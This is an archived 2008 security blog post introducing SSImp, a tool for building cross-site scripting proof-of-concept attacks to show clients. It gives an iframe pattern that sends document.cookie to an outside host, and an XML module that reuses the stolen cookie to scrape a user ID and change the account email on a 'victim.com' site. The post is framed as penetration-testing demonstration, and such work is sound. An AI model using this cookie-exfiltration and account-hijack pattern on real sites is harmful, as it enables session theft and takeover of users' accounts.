---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2008/02/02/an-xml-based-xss-poc-platform
categories:
- Information Security
- Programming
comments:
- author: The importance of weaponization in exploit development | Martin Paul Eve
  author_email: ''
  author_url: http://www.martineve.com/2008/09/24/the-importance-of-weaponization-in-exploit-development/
  content: '[...] so my JavaScript then offsite-loaded the cookie into an SSImp module
    that I had written which instantly connected back to the site and changed the
    user&#8217;s [...]'
  date: 2010-11-07 12:27:21 +0100
  date_gmt: 2010-11-07 12:27:21 +0100
  id: 187
date: 2008-02-02 17:57:44 +0100
date_gmt: 2008-02-02 17:57:44 +0100
doi: https://doi.org/10.59348/nhjwb-ywd61
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
- .NET
- C#
- XSS
title: An XML based XSS PoC platform
wordpress_id: 258
wordpress_url: http://pro.grammatic.org/post-an-xml-based-xss-poc-platform-43.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mn6a4j42u"
---

<p>Well, long time no post. Been in hospital. Been busy with college. Life gets in the way of hacking.</p>
<p>Usually when one wast to illustrate an XSS vulnerability there are two approaches. The first is to show the client the XSS and assume that they know and understand the impact. The second is to write a fully fledged exploit which takes some form of action on the client's server so that they can see the truly devastating impact. I frequently find that the second of these options is the only possible way to draw attention to the problems of XSS, but I have also grown very tired of having to write these from scratch, setting up cookie loggers etc.</p>
<p>The solution that I have come up with is called the ServerSideImpersonator or SSImp.</p>
<p>Here's how it works:</p>
<ol>
<li>Find an injection point.</li>
<li>Craft the javascript so that it opens an iframe to http://host/SSImp/?module=the_module&amp;action=the_action&amp;cookie=document.cookie</li>
<li>Write a module that does what you want.</li>
</ol>
<p>To explain what happens then...</p>
<p>The server side script on http://host then crafts http requests using the cookie provided in the cookie querystring to carry out remote actions on the server which is far easier than tinkering around using JavaScript and having the Same Origin Policy getting in the way etc. It also avoids the time delay that usually prevents cookie stealing from being effective.</p>
<p>Here's an example of a test module that I recently created:</p>
{% highlight xml %}
<?xml version="1.0" encoding="utf-8" ?>
<modules>
	<action name="the_action">
		<requires type="querystring" name="cookie" />
		<request url="https://www.victim.com/getauserid.php" type="get">
			<setcookie type="querystring" name="cookie" />
			<storevariable name="userid" type="regex" pattern="UserID=(\d+)" group="1" />
		</request>
		<request url="https://www.victim.com/settings.php" type="post">
			<setcookie type="querystring" name="cookie" />
			<postdata value="Email=username%40gmail.com&amp;UserID=[VAR:userid]&amp;action=new+email"></postdata>
		</request>
		<output>UserID="[VAR:userid]".</output>
	</action>
</modules>
{% endhighlight %}

<p>So, what does this do?</p>
<ol>
<li>Makes a GET request to https://www.victim.com/getauserid.php, using the cookie that was passed in the cookie querystring parameter</li>
<li>Looks on the resulting page for a regex match for UserID=(\d+) and if found stores Group 1, Capture 0 in the variable called userid</li>
<li>Makes a POST request to https://www.victim.com/settings.php, using the cookie that was passed in the cookie querystring parameter, posting the data "Email=username%40gmail.com&amp;UserID=[VAR:userid]&amp;action=new+email" and substituting [VAR:userid] for the variable that was fetched in the previous request</li>
</ol>
<p>This seems to me a far quicker way for constructing XSS PoC attacks and I will continue to update the framework as I get time. I also plan, time permitting, to get back to work on the .NETIDS which has lapsed in the last few months for the aforementioned reasons.</p>
<p>Check out the SSImp source (C#) at <a href="http://code.google.com/p/ssimp/">http://code.google.com/p/ssimp/</a></p>